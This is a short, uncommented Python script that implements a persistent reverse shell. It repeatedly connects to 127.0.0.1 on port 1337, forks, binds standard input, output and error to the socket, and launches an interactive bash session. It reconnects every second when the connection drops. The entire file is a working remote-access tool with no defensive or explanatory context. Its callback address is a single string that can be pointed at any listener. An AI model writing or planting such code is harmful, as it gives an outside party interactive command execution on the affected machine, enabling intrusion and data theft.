#!/usr/bin/env python

import os
import signal
import socket
import time

signal.signal(signal.SIGCHLD, signal.SIG_IGN)

while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)

    try:
        s.connect(("127.0.0.1", 1337))
    except OSError:
        s.close()
        time.sleep(1)
        continue

    s.settimeout(None)
    pid = os.fork()

    if pid == 0:
        signal.signal(signal.SIGCHLD, signal.SIG_DFL)
        os.setsid()

        for fd in (0, 1, 2):
            os.dup2(s.fileno(), fd)

        os.closerange(3, 64)
        os.execvp("/bin/bash", ["/bin/bash", "--noediting", "-i"])
        os._exit(1)

    s.close()
    time.sleep(1)
